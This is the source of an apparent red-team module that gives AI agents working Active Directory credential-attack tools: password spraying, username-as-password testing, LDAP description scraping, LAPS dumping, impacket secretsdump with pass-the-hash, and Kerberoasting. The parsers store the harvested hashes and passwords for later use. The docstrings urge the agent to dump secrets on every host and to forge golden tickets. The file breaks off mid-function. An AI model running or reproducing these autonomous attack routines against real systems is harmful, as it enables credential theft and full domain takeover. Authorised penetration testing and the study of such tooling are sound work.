"""Red Team credential discovery and harvesting tools.

This module provides toolsets for credential attacks including:
- Low-hanging fruit discovery (passwords in descriptions, username=password)
- Password spraying
- Kerberoasting and AS-REP roasting
- Hash cracking
- Share pilfering
"""

import asyncio
import logging
import re
import shlex
import time
import uuid
from pathlib import Path
from typing import Any, ClassVar

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset

from ares.core.models import Credential, Hash, User
from ares.core.remote import run_remote
from ares.tools.red.common import (
    PLACEHOLDER_PASSWORDS,
    AnyRedTeamState,
    add_credential_to_state,
    filter_users_file_remote,
    find_remote_users_file,
    format_weakness_block,
    is_ntlm_hash,
    resolve_host_or_ip,
    resolve_password,
    run_tool,
    write_users_file_remote,
)

logger = logging.getLogger(__name__)


class CredentialDiscoveryTools(Toolset):
    """Tools for discovering credentials through low-hanging fruit attacks.

    These tools find easy wins that should be run FIRST before complex attacks:
    - Passwords in LDAP description fields
    - Username=password combinations
    - Password spraying with common passwords
    """

    state: AnyRedTeamState | None = None
    dispatcher: Any | None = None
    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def set_dispatcher(self, dispatcher) -> None:
        self.dispatcher = dispatcher

    def _resolve_password(
        self,
        username: str,
        domain: str | None,
        password: str | None,
    ) -> str | None:
        return resolve_password(self.state, username, domain, password)

    def _run_user_enum_commands(
        self, target: str, username: str, password: str, domain: str
    ) -> list[tuple[str, str]]:
        from ares.tools.red.reconnaissance import NetworkEnumerationTools

        enum_tools = NetworkEnumerationTools()
        if self.state:
            enum_tools.set_state(self.state)
        return enum_tools._run_user_enum_commands(target, username, password, domain)

    def _extract_users_from_outputs(self, outputs: list[tuple[str, str]]) -> set[str]:
        from ares.tools.red.reconnaissance import NetworkEnumerationTools

        return NetworkEnumerationTools()._extract_users_from_outputs(outputs)

    def _add_weakness(self, block: str) -> None:
        if not self.state or not block:
            return
        if block not in self.state.weaknesses:
            self.state.weaknesses.append(block)

    def _add_credential(
        self,
        username: str,
        password: str,
        domain: str,
        source: str,
        is_admin: bool = False,
    ) -> None:
        if not self.state or not username:
            return
        cred = Credential(
            username=username,
            password=password,
            domain=domain,
            source=source,
            is_admin=is_admin,
        )
        add_credential_to_state(self.state, cred, "recon", self.dispatcher)

    def _parse_netexec_credentials(self, result: str) -> list[tuple[str, str, str, bool]]:
        creds: list[tuple[str, str, str, bool]] = []
        if not result:
            return creds
        failure_markers = (
            "STATUS_LOGON_FAILURE",
            "STATUS_PASSWORD_EXPIRED",
            "STATUS_PASSWORD_MUST_CHANGE",
            "STATUS_ACCOUNT_LOCKED_OUT",
            "STATUS_ACCOUNT_DISABLED",
            "STATUS_ACCOUNT_RESTRICTION",
            "STATUS_NO_LOGON_SERVERS",
            "STATUS_ACCESS_DENIED",
            "STATUS_INVALID_LOGON_HOURS",
            "STATUS_INVALID_WORKSTATION",
            "NT_STATUS_",
            "LOGON FAILURE",
            "LOGON_FAILURE",
            "ACCESS_DENIED",
        )
        for line in result.splitlines():
            if "[+]" not in line and "Pwn3d!" not in line:
                continue
            line_upper = line.upper()
            if any(marker in line_upper for marker in failure_markers):
                continue
            if "(Guest)" in line:
                continue
            match = re.search(r"([A-Za-z0-9_.-]+)\\([^:\s]+):(\S+)", line)
            if not match:
                continue
            domain, username, password = match.groups()
            if "/" in username or "\\" in username or username.endswith(".txt"):
                continue
            if "/" in password or "\\" in password or password.endswith(".txt"):
                continue
            is_admin = "pwn3d!" in line.lower()
            creds.append((domain, username, password, is_admin))
        return creds

    def _extract_passwords_from_user_enum_output(self, output: str) -> list[tuple[str, str]]:  # noqa: PLR0912
        if not output:
            return []
        creds: list[tuple[str, str]] = []
        current_user = ""
        for line in output.splitlines():
            stripped = line.strip()
            if not stripped:
                continue

            user_match = re.search(r"user:\[([^\]]+)\]", stripped, re.IGNORECASE)
            if user_match:
                current_user = user_match.group(1).strip()

            account_match = re.search(r"Account:\s*([A-Za-z0-9_.-]+)", stripped)
            if account_match:
                current_user = account_match.group(1).strip()

            sam_match = re.search(r"samaccountname:\s*([A-Za-z0-9_.-]+)", stripped, re.IGNORECASE)
            if sam_match:
                current_user = sam_match.group(1).strip()

            if "password" not in stripped.lower():
                continue

            pass_match = re.search(r"Password\s*:\s*([^\s\)]+)", stripped, re.IGNORECASE)
            if not pass_match:
                continue
            password = pass_match.group(1).strip()

            username = ""
            account_inline = re.search(r"Account:\s*([A-Za-z0-9_.-]+)", stripped)
            if account_inline:
                username = account_inline.group(1).strip()
            elif current_user:
                username = current_user
            else:
                netexec_match = re.search(
                    r"\b([A-Za-z0-9_.-]+)\b\s+\d{4}-\d{2}-\d{2}.*Password\s*:\s*",
                    stripped,
                )
                if netexec_match:
                    username = netexec_match.group(1).strip()

            if not username:
                continue
            if "/" in username or "\\" in username or username.endswith(".txt"):
                continue
            if "/" in password or "\\" in password or password.endswith(".txt"):
                continue

            creds.append((username, password))
        return creds

    def _resolve_host_or_ip(self, host: str) -> str:
        return resolve_host_or_ip(self.state, host)

    def _extract_password_from_description(self, username: str, description: str) -> str | None:
        if not description:
            return None
        match = re.search(r"(?:password|pass|pwd)\s*[:=]\s*([^\s,;]+)", description, re.IGNORECASE)
        if match:
            return match.group(1)
        if username:
            user_match = re.search(
                rf"{re.escape(username)}\s*[:/\-]\s*([^\s,;]+)", description, re.IGNORECASE
            )
            if user_match:
                return user_match.group(1)
        return None

    def _iter_description_entries(self, raw_output: str) -> list[tuple[str, str]]:
        entries: list[tuple[str, str]] = []
        current_user = ""
        current_desc = ""
        for raw_line in raw_output.splitlines():
            stripped = raw_line.strip()
            if not stripped:
                if current_user and current_desc:
                    entries.append((current_user, current_desc))
                current_user = ""
                current_desc = ""
                continue
            lower = stripped.lower()
            if lower.startswith("samaccountname:"):
                current_user = stripped.split(":", 1)[1].strip()
            elif lower.startswith("description:"):
                current_desc = stripped.split(":", 1)[1].strip()
        if current_user and current_desc:
            entries.append((current_user, current_desc))
        return entries

    @dn.tool_method
    def ldap_search_descriptions(
        self,
        target: str,
        domain: str,
        username: str,
        password: str,
    ) -> str:
        """
        Search for passwords stored in user description fields (LOW HANGING FRUIT).

        Many environments have passwords stored in the description attribute of user
        accounts. This is a common misconfiguration that provides immediate access.

        **RUN THIS EARLY** - It's fast and often yields credentials like dave.lee:ExamplePass123!.

        Args:
            target: Domain controller IP address
            domain: Target domain (e.g., 'example.local')
            username: Username for LDAP authentication
            password: Password for authentication

        Returns:
            Users with non-empty descriptions (check for passwords!)

        Example:
            >>> ldap_search_descriptions("192.168.56.10", "example.local", "user", "pass")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."
        if self.state and hasattr(self.state, "add_domain"):
            self.state.add_domain(domain)

        base_dn = ",".join([f"DC={part}" for part in domain.split(".")])

        cmd = [
            "ldapsearch",
            "-x",
            "-H",
            f"ldap://{target}",
            "-D",
            f"{username}@{domain}",
            "-w",
            resolved_password or "",
            "-b",
            base_dn,
            "(&(objectClass=user)(description=*))",
            "sAMAccountName",
            "description",
            "userPrincipalName",
        ]

        try:
            logger.info(f"[*] Searching LDAP descriptions for passwords in {domain}")
            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=120)
            raw_output = stdout + "\n" + (stderr or "")
            result = raw_output

            if "description:" in result.lower():
                logger.warning("[!] Found users with descriptions - CHECK FOR PASSWORDS!")
                result = (
                    "\ud83d\udea8 USERS WITH DESCRIPTIONS FOUND - CHECK FOR PASSWORDS!\n"
                    "\u2192 Common pattern: user 'dave.lee' has password 'ExamplePass123!' in description\n"
                    "\u2192 Test any found credentials immediately with domain_admin_checker\n\n"
                    + result
                )

            if self.state:
                for entry_user, entry_desc in self._iter_description_entries(raw_output):
                    password_value = self._extract_password_from_description(entry_user, entry_desc)
                    if password_value:
                        self._add_credential(
                            entry_user,
                            password_value,
                            domain,
                            "ldap_description",
                        )
                        details = {
                            "Affected Account": entry_user,
                            "Description": entry_desc,
                            "Password": password_value,
                        }
                        block = format_weakness_block(
                            "Credential Discovery - Password in User Description Field",
                            "Plaintext passwords stored in user description attribute",
                            details,
                            "Immediate authenticated access",
                            "LDAP enumeration",
                        )
                        self._add_weakness(block)

            return result

        except Exception as e:
            return f"LDAP search failed: {e}"

    @dn.tool_method
    def password_spray(  # noqa: PLR0912
        self,
        target: str,
        domain: str,
        password: str,
        users_file: str = "",
        delay_seconds: int = 0,
    ) -> str:
        """
        Test a single password against all domain users (password spraying).

        Password spraying tests one password against many users to avoid lockouts.
        Common passwords to try: 'Password1', 'Welcome1', 'Company123', season+year.

        **CRITICAL**: Check lockout policy first. Default is usually 5 attempts.

        If no users_file is provided, this tool will automatically enumerate users
        from the target first using null session authentication.

        Args:
            target: Domain controller IP address
            domain: Target domain
            password: Password to spray
            users_file: Path to file containing usernames (optional - will auto-enumerate if not provided)
            delay_seconds: Delay between attempts (default: 0)

        Returns:
            Successful authentications (look for valid credentials)

        Example:
            >>> password_spray("192.168.56.10", "child.example.local", "Password1")  # auto-enumerate
            >>> password_spray("192.168.56.10", "child.example.local", "Password1", "/tmp/users.txt")
        """
        try:
            if not users_file:
                logger.info(f"[*] No users file provided, auto-enumerating from {target}")
                enumerated_file = self._enumerate_users_to_file(target)
                if not enumerated_file:
                    fallback = find_remote_users_file(["/tmp/users.txt", "/tmp/users_auto.txt"])  # nosec B108 # noqa: S108
                    if not fallback:
                        return (
                            "[!] Failed to enumerate users and no users_file provided. "
                            "Try save_users_to_file first."
                        )
                    logger.info(f"[*] Using existing users file on remote: {fallback}")
                    users_file = fallback
                else:
                    users_file = enumerated_file

            if self.state and self.state.credentials:
                exclude_users: set[str] = set()
                domain_key = domain.strip().lower()
                for cred in self.state.credentials:
                    if not cred.username:
                        continue
                    cred_domain = (cred.domain or "").strip().lower()
                    if domain_key and cred_domain and cred_domain != domain_key:
                        continue
                    exclude_users.add(cred.username.lower())
                if exclude_users:
                    filtered_file, error = filter_users_file_remote(users_file, exclude_users)
                    if error == "all users already have credentials":
                        return "[!] Password spray skipped: all users already have credentials."
                    if error:
                        logger.warning(f"[!] Failed to filter users file: {error}")
                    elif filtered_file:
                        users_file = filtered_file

            cmd = [
                "netexec",
                "smb",
                target,
                "-u",
                users_file,
                "-p",
                password,
                "-d",
                domain,
                "--continue-on-success",
            ]

            if delay_seconds > 0:
                cmd.extend(["--jitter", str(delay_seconds)])

            logger.info(f"[*] Password spraying {domain} with password: {password}")
            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")
            creds = self._parse_netexec_credentials(result)
            matching_creds = [cred for cred in creds if cred[2] == password]

            if creds and not matching_creds:
                logger.warning(
                    "[!] Password spray parsed credentials, but none matched the sprayed password; "
                    "ignoring to avoid false positives."
                )

            if matching_creds:
                logger.warning("[!] PASSWORD SPRAY FOUND VALID CREDENTIALS!")
                result = (
                    "\ud83d\udea8 VALID CREDENTIALS FOUND!\n"
                    "\u2192 Look for [+] lines indicating successful auth\n"
                    "\u2192 'Pwn3d!' indicates ADMIN access\n"
                    "\u2192 Use found credentials for further recon\n\n" + result
                )
            elif "(Guest)" in result:
                filtered_lines = [line for line in result.splitlines() if "(Guest)" not in line]
                result = "\n".join(filtered_lines)
                result += "\n[!] Guest-only SMB access detected; ignore as valid credentials."

            if self.state and matching_creds:
                accounts = []
                for cred_domain, username, found_password, is_admin in matching_creds:
                    self._add_credential(
                        username,
                        found_password,
                        cred_domain,
                        "password_spray",
                        is_admin=is_admin,
                    )
                    accounts.append(f"{cred_domain}\\{username}")
                block = format_weakness_block(
                    "Credential Discovery - Password Spray Success",
                    "Weak password choice allows password spraying",
                    {
                        "Discovered Accounts": ", ".join(sorted(set(accounts))),
                        "Password": password,
                    },
                    "Enables credential stuffing and rapid access",
                    "Password spraying",
                )
                self._add_weakness(block)

            return result

        except Exception as e:
            return f"Password spray failed: {e}"

    def _enumerate_users_to_file(self, target: str) -> str | None:
        """Enumerate users from target and save to temp file. Returns file path or None."""
        try:
            username, password, domain = "", "", ""
            if self.state and self.state.credentials:
                cred = self.state.credentials[0]
                username, password, domain = cred.username, cred.password, cred.domain
                logger.info(f"[*] Using credential {domain}\\{username} for user recon")

            outputs = self._run_user_enum_commands(target, username, password, domain)
            users = self._extract_users_from_outputs(outputs)

            if not users:
                from ares.tools.red.reconnaissance import NetworkEnumerationTools

                helper = NetworkEnumerationTools()
                summary = helper._summarize_enum_outputs(outputs)
                if summary:
                    logger.warning(f"[!] No users enumerated from {target}. Status:\n{summary}")
                else:
                    logger.warning(f"[!] No users enumerated from {target}")
                return None

            users_file = "/tmp/users_auto.txt"  # nosec B108  # noqa: S108
            ok, error = write_users_file_remote(sorted(users), users_file)
            if not ok:
                logger.warning(f"[!] Failed to write users file on remote: {error}")
                return None
            logger.info(f"[+] Auto-enumerated {len(users)} users to {users_file}")
            return users_file

        except Exception as e:
            logger.error(f"Auto user recon failed: {e}")
            return None

    @dn.tool_method
    def username_as_password(
        self,
        target: str,
        domain: str,
        users_file: str = "",
    ) -> str:
        """
        Test if any user has their username as their password (LOW HANGING FRUIT).

        Many users set their password to match their username (e.g., user1:user1).
        This is fast, safe (one attempt per user), and often successful.

        **RUN THIS EARLY** - Zero lockout risk, high success rate in weak environments.

        If no users_file is provided, this tool will automatically enumerate users
        from the target first using null session authentication.

        Args:
            target: Domain controller IP address
            domain: Target domain
            users_file: Path to file containing usernames (optional - will auto-enumerate if not provided)

        Returns:
            Users with username=password combinations

        Example:
            >>> username_as_password("192.168.56.10", "child.example.local")  # auto-enumerate
            >>> username_as_password("192.168.56.10", "child.example.local", "/tmp/users.txt")
        """
        try:
            if not users_file:
                logger.info(f"[*] No users file provided, auto-enumerating from {target}")
                enumerated_file = self._enumerate_users_to_file(target)
                if not enumerated_file:
                    fallback = find_remote_users_file(["/tmp/users.txt", "/tmp/users_auto.txt"])  # nosec B108 # noqa: S108
                    if not fallback:
                        return (
                            "[!] Failed to enumerate users and no users_file provided. "
                            "Try save_users_to_file first."
                        )
                    logger.info(f"[*] Using existing users file on remote: {fallback}")
                    users_file = fallback
                else:
                    users_file = enumerated_file

            cmd = [
                "netexec",
                "smb",
                target,
                "-u",
                users_file,
                "-p",
                users_file,
                "-d",
                domain,
                "--no-bruteforce",
                "--continue-on-success",
            ]

            logger.info(f"[*] Testing username=password combinations in {domain}")
            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            creds = self._parse_netexec_credentials(result)
            matching: list[tuple[str, str, str, bool]] = []
            for cred_domain, username, found_password, is_admin in creds:
                if found_password.lower() != username.lower():
                    continue
                matching.append((cred_domain, username, found_password, is_admin))

            if matching:
                accounts = sorted(
                    {f"{cred_domain}\\{username}" for cred_domain, username, _, _ in matching}
                )
                logger.warning(
                    "[!] FOUND USER WITH USERNAME=PASSWORD! Accounts: %s",
                    ", ".join(accounts),
                )
                result = (
                    "\ud83d\udea8 USERNAME=PASSWORD FOUND!\n"
                    f"\u2192 Accounts: {', '.join(accounts)}\n"
                    "\u2192 Common examples: user1:user1, guest:guest\n"
                    "\u2192 Use found credentials for kerberoast, asrep_roast, bloodhound\n\n"
                    + result
                )
            elif creds:
                logger.warning(
                    "[!] username_as_password saw successful auth, but none matched username=password; "
                    "ignoring to avoid false positives."
                )
            if "(Guest)" in result:
                filtered_lines = [line for line in result.splitlines() if "(Guest)" not in line]
                result = "\n".join(filtered_lines)
                result += "\n[!] Guest-only SMB access detected; ignore as valid credentials."

            if self.state and matching:
                for cred_domain, username, found_password, is_admin in matching:
                    self._add_credential(
                        username,
                        found_password,
                        cred_domain,
                        "username_as_password",
                        is_admin=is_admin,
                    )
                block = format_weakness_block(
                    "Credential Discovery - Username=Password Combinations",
                    "Users with passwords matching their usernames",
                    {
                        "Discovered Accounts": ", ".join(sorted(set(accounts))),
                    },
                    "Immediate authenticated access",
                    "Username-as-password test",
                )
                self._add_weakness(block)

            return result

        except Exception as e:
            return f"Username-as-password test failed: {e}"

    @dn.tool_method
    def password_policy(
        self,
        target: str,
        domain: str,
        username: str,
        password: str,
    ) -> str:
        """
        Retrieve domain password policy settings.

        Use this to check complexity requirements, minimum password length,
        and lockout thresholds before password spraying.

        Args:
            target: Domain controller IP address
            domain: Target domain
            username: Username for authentication
            password: Password for authentication

        Returns:
            Password policy details from the domain controller

        Example:
            >>> password_policy("192.168.56.10", "example.local", "user", "pass")
        """
        cmd = [
            "netexec",
            "smb",
            target,
            "-u",
            username,
            "-p",
            password,
            "-d",
            domain,
            "--pass-pol",
        ]

        try:
            logger.info(f"[*] Querying password policy for {domain}")
            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=120)
            result = stdout + "\n" + (stderr or "")

            min_length = None
            lockout_threshold = None
            complexity_value = None

            min_match = re.search(
                r"(?:minimum|min)\s+password\s+length\s*:\s*(\d+)",
                result,
                re.IGNORECASE,
            )
            if min_match:
                min_length = int(min_match.group(1))

            lockout_match = re.search(
                r"lockout\s+threshold\s*:\s*(\d+)",
                result,
                re.IGNORECASE,
            )
            if lockout_match:
                lockout_threshold = int(lockout_match.group(1))

            complexity_match = re.search(
                r"(?:password\s+complexity|complexity)\s*:\s*([A-Za-z0-9_\-]+)",
                result,
                re.IGNORECASE,
            )
            if complexity_match:
                complexity_value = complexity_match.group(1).strip()

            is_weak = False
            if min_length is not None and min_length < 8:
                is_weak = True
            if complexity_value:
                complexity_lower = complexity_value.lower()
                if complexity_lower in {"disabled", "false", "no", "off", "0"}:
                    is_weak = True

            if self.state and is_weak:
                details: dict[str, str] = {}
                if min_length is not None:
                    details["Minimum Password Length"] = str(min_length)
                if lockout_threshold is not None:
                    details["Lockout Threshold"] = str(lockout_threshold)
                if complexity_value:
                    details["Complexity Requirements"] = complexity_value
                block = format_weakness_block(
                    "Credential Discovery - Weak Password Policy",
                    "Insufficient password complexity requirements",
                    details,
                    "Enables password spraying attacks",
                    "Password policy recon",
                )
                self._add_weakness(block)

            return result

        except Exception as e:
            return f"Password policy check failed: {e}"

    @dn.tool_method
    def laps_dump(
        self,
        target: str,
        domain: str,
        username: str,
        password: str,
    ) -> str:
        """
        Dump LAPS (Local Administrator Password Solution) passwords.

        LAPS stores randomized local admin passwords in AD. If you have read access
        to the ms-Mcs-AdmPwd attribute, you can retrieve local admin passwords.

        Use when you have elevated permissions or after ACL abuse grants read access.

        Args:
            target: Domain controller IP address
            domain: Target domain
            username: Username for authentication
            password: Password for authentication

        Returns:
            LAPS passwords for computers where you have read access

        Example:
            >>> laps_dump("192.168.56.10", "example.local", "user", "pass")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "netexec",
            "ldap",
            target,
            "-u",
            username,
            "-p",
            resolved_password or "",
            "-d",
            domain,
            "-M",
            "laps",
        ]

        try:
            logger.info(f"[*] Dumping LAPS passwords from {domain}")
            stdout, stderr, _returncode = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "password" in result.lower() or "laps" in result.lower():
                logger.info("[+] LAPS passwords retrieved!")
                result = (
                    "\ud83d\udccb LAPS PASSWORDS RETRIEVED\n"
                    "\u2192 These are local Administrator passwords for specific computers\n"
                    "\u2192 Use with evil_winrm or psexec against the target computer\n\n" + result
                )

            return result

        except Exception as e:
            return f"LAPS dump failed: {e}"


class CredentialHarvestingTools(Toolset):
    """Tools for harvesting credentials via Active Directory attacks."""

    state: AnyRedTeamState | None = None
    dispatcher: Any | None = None
    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def set_dispatcher(self, dispatcher) -> None:
        """Set the dispatcher for inter-agent communication."""
        self.dispatcher = dispatcher

    def _resolve_password(
        self,
        username: str,
        domain: str | None,
        password: str | None,
    ) -> str | None:
        return resolve_password(self.state, username, domain, password)

    def _check_smb_connectivity(self, target: str, timeout_seconds: int = 5) -> tuple[bool, str]:
        """Check if SMB port 445 is reachable on target."""
        cmd = ["nc", "-zv", "-w", str(timeout_seconds), target, "445"]
        try:
            ssm_timeout = max(30, timeout_seconds + 5)
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=ssm_timeout)
            if returncode == 0:
                return True, ""
            return False, f"SMB port 445 not reachable: {stderr or stdout}"
        except Exception as e:
            return False, f"Connectivity check failed: {e}"

    def _parse_secretsdump_output(
        self, output: str, domain: str | None, target: str
    ) -> tuple[str, list[dict], bool, bool]:
        """Parse secretsdump output for NTLM hashes.

        Args:
            output: Raw secretsdump output
            domain: Target domain name
            target: Target IP/hostname

        Returns:
            Tuple of (formatted_output, parsed_hashes, has_krbtgt, has_administrator)
        """
        if not output:
            return output, [], False, False

        # Pattern for secretsdump hash lines:
        # username:rid:lmhash:nthash:::
        # or domain\username:rid:lmhash:nthash:::
        hash_pattern = re.compile(
            r"^(?:([^\\:\s]+)\\)?([^:]+):(\d+):([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::$",
            re.MULTILINE,
        )

        parsed_hashes: list[dict] = []
        has_krbtgt = False
        has_administrator = False

        for match in hash_pattern.finditer(output):
            hash_domain = match.group(1) or domain or ""
            username = match.group(2)
            rid = int(match.group(3))
            lm_hash = match.group(4)
            nt_hash = match.group(5)

            # Skip empty/null hashes (well-known empty password hash)
            if nt_hash == "31d6cfe0d16ae931b73c59d7e0c089c0":  # pragma: allowlist secret
                continue  # Empty password hash

            hash_value = f"{lm_hash}:{nt_hash}"
            is_krbtgt = rid == 502 or username.lower() == "krbtgt"
            is_administrator = rid == 500 or username.lower() == "administrator"

            if is_krbtgt:
                has_krbtgt = True
                logger.warning(f"[!] KRBTGT HASH FOUND! RID={rid}")
            if is_administrator:
                has_administrator = True
                logger.warning(f"[!] ADMINISTRATOR HASH FOUND! RID={rid}")

            parsed_hashes.append(
                {
                    "username": username,
                    "domain": hash_domain,
                    "rid": rid,
                    "hash_value": hash_value,
                    "nt_hash": nt_hash,
                    "is_krbtgt": is_krbtgt,
                    "is_administrator": is_administrator,
                }
            )

            # Add to state
            if self.state:
                from ares.core.models import Hash

                hash_obj = Hash(
                    username=username,
                    hash_value=hash_value,
                    hash_type="NTLM",
                    domain=hash_domain,
                )
                if hasattr(self.state, "add_hash"):
                    self.state.add_hash(hash_obj, "secretsdump")
                elif hasattr(self.state, "hashes"):
                    self.state.hashes.append(hash_obj)

        # Prepend summary if high-value hashes found
        summary_lines = []
        if has_krbtgt:
            summary_lines.append(
                "🚨 KRBTGT HASH EXTRACTED - GOLDEN TICKET POSSIBLE!\n"
                "→ Use generate_golden_ticket to forge tickets\n"
                "→ This grants PERSISTENT domain admin access"
            )
        if has_administrator:
            summary_lines.append(
                "🚨 ADMINISTRATOR HASH EXTRACTED - DOMAIN ADMIN ACHIEVED!\n"
                "→ Use domain_admin_checker to verify access\n"
                "→ Run secretsdump on all remaining DCs"
            )

        formatted_output = "\n\n".join(summary_lines) + "\n\n" + output if summary_lines else output

        return formatted_output, parsed_hashes, has_krbtgt, has_administrator

    @dn.tool_method
    def secretsdump(  # noqa: PLR0912
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        dc_ip: str | None = None,
        no_pass: bool = False,
        timeout_minutes: int = 3,
        connection_timeout: int = 30,
        skip_connectivity_check: bool = False,
    ) -> str:
        """
        Extract secrets using impacket-secretsdump for credential harvesting.

        This is one of the most powerful tools for extracting credentials from
        Windows systems. It dumps SAM database, cached credentials, and LSA secrets.
        **CRITICAL: When you have admin access, run this on ALL targets, not just one.**

        Args:
            target: Target IP address or domain name
            username: Username with admin privileges
            password: Password for the username (optional)
            hash: NTLM hash for pass-the-hash authentication (optional)
            domain: Domain name (optional, can be inferred)
            dc_ip: Domain controller IP address (recommended for DC targets to avoid DNS issues)
            no_pass: If True, use Kerberos golden ticket authentication
            timeout_minutes: Maximum time to spend dumping (default: 3)
            connection_timeout: Timeout for initial SMB connection in seconds (default: 30)
            skip_connectivity_check: Skip the SMB port check (default: False)

        Returns:
            Extracted credentials including NTLM hashes, Kerberos keys, and secrets

        Example:
            >>> secretsdump("192.168.1.100", "admin", password="pass")  # pragma: allowlist secret
            >>> secretsdump("192.168.1.100", "admin", hash="aad3b4...")
            >>> secretsdump("domain.local", "admin", no_pass=True)
        """
        resolved_password = self._resolve_password(username, domain, password)
        if hash and not is_ntlm_hash(hash):
            return (
                "[!] Refusing to use non-NTLM hash for secretsdump; provide password or NTLM hash."
            )
        if (
            hash
            and resolved_password
            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
        ):
            resolved_password = None
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."
        if self.state and hasattr(self.state, "add_domain") and domain:
            self.state.add_domain(domain)

        if not skip_connectivity_check:
            is_reachable, error_msg = self._check_smb_connectivity(target)
            if not is_reachable:
                return f"[!] Target {target} is not reachable on SMB port 445. {error_msg}"

        cmd = ["timeout", str(connection_timeout), "impacket-secretsdump"]

        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])

        if resolved_password and domain:
            target_string = f"{domain}/{username}:{resolved_password}@{target}"
        elif resolved_password and not domain:
            target_string = f"{username}:{resolved_password}@{target}"
        elif hash and domain:
            cmd.extend(["-hashes", f":{hash}"])
            target_string = f"{domain}/{username}@{target}"
        elif hash and not domain:
            cmd.extend(["-hashes", f":{hash}"])
            target_string = f"{username}@{target}"
        elif no_pass:
            cmd.extend(["-k", "-no-pass"])
            target_string = f"{username}@{target}"
        else:
            return "[!] Error: Either password, hash, or no_pass must be provided"

        cmd.append(target_string)

        if no_pass:
            cmd = ["env", "KRB5CCNAME=Administrator.ccache"] + cmd

        try:
            logger.info(f"[*] Running secretsdump on {target} with {username}")

            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=timeout_minutes * 60)

            if returncode == 124:
                return (
                    f"[!] Secretsdump timed out after {connection_timeout}s connecting to {target}. "
                    "Target may be unreachable or credentials invalid."
                )

            logger.info(f"[*] Secretsdump completed for {target}")
            raw_output = stdout or stderr or f"Secretsdump returned code {returncode}"

            # Parse the output to extract hashes and detect high-value accounts
            formatted_output, _parsed_hashes, has_krbtgt, has_administrator = (
                self._parse_secretsdump_output(raw_output, domain, target)
            )

            # Auto-announce Domain Admin if krbtgt or Administrator hash found
            if (has_krbtgt or has_administrator) and self.dispatcher:
                try:
                    cred_type = "krbtgt_hash" if has_krbtgt else "administrator_hash"
                    attack_path = (
                        f"krbtgt hash via secretsdump on {target}"
                        if has_krbtgt
                        else f"Administrator hash via secretsdump on {target}"
                    )

                    # Run async announce in sync context
                    asyncio.run(
                        self.dispatcher.announce_domain_admin(
                            username="Administrator",
                            domain=domain or "",
                            attack_path=attack_path,
                            credential_type=cred_type,
                            source_agent="credential_access",
                        )
                    )
                    logger.success(f"🎯 DOMAIN ADMIN AUTO-ANNOUNCED! {cred_type} found on {target}")
                except Exception as e:
                    logger.warning(f"Failed to auto-announce DA: {e}")

            return formatted_output

        except Exception as e:
            return f"[!] Secretsdump error: {e}"

    @dn.tool_method
    def kerberoast(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Perform Kerberoasting attack to extract service account password hashes.

        Kerberoasting is a technique for extracting Kerberos TGS hashes for accounts
        with Service Principal Names (SPNs). These hashes can be cracked offline to
        obtain service account passwords, which often have elevated privileges.

        Args:
            domain: Target domain (e.g., 'example.local')
            username: Valid domain username
            password: Password for the username
            dc_ip: Domain controller IP address

        Returns:
            Kerberos TGS hashes for service accounts that can be cracked offline

        Example:
            >>> kerberoast("example.local", "user", "pass", "192.168.1.100")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "impacket-GetUserSPNs",
            f"{domain}/{username}:{resolved_password}",
            "-dc-ip",
            dc_ip,
            "-request",
        ]

        try:
            logger.info(f"[*] Kerberoasting {domain} using {username}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)
            output = (stdout or "") + ("\n" + stderr if stderr else "")

            if self.state and output:
                matches = re.findall(r"(\$krb5tgs\$[^\s]+)", output)
                for value in matches:
                    username_value = "Unknown"
                    domain_value = ""
                    parts = value.split("$")
                    if len(parts) >= 5:
                        user_part = parts[3].lstrip("*")
                        realm_part = parts[4]
                        if user_part:
                            username_value = user_part
                        if realm_part:
                            domain_value = realm_part
                    hash_obj = Hash(
                        username=username_value,
                        hash_value=value,
                        hash_type="Kerberos",
                        domain=domain_value or domain,
                    )
                    if hasattr(self.state, "add_hash"):
                        self.state.add_hash(hash_obj, "kerberoast")
                    else:
                        self.state.hashes.append(hash_obj)

            return output

        except Exception as e:
            return f"Kerberoasting failed: {e!s}"

    @dn.tool_method
    def kerberos_user_enum_noauth(  # noqa: PLR0912
        self,
        domain: str,
        dc_ip: str,
        users_file: str = "",
    ) -> str:
        """
        Validate usernames via Kerberos without creds using GetNPUsers.py -no-pass.

        This uses unauthenticated Kerberos pre-auth recon to confirm
        valid principals even when SMB/LDAP recon is blocked.

        Args:
            domain: Target domain (e.g., 'example.local')
            dc_ip: Domain controller IP address
            users_file: Path to usernames file (optional)

        Returns:
            Raw tool output with a summary of validated principals (if any)
        """
        try:
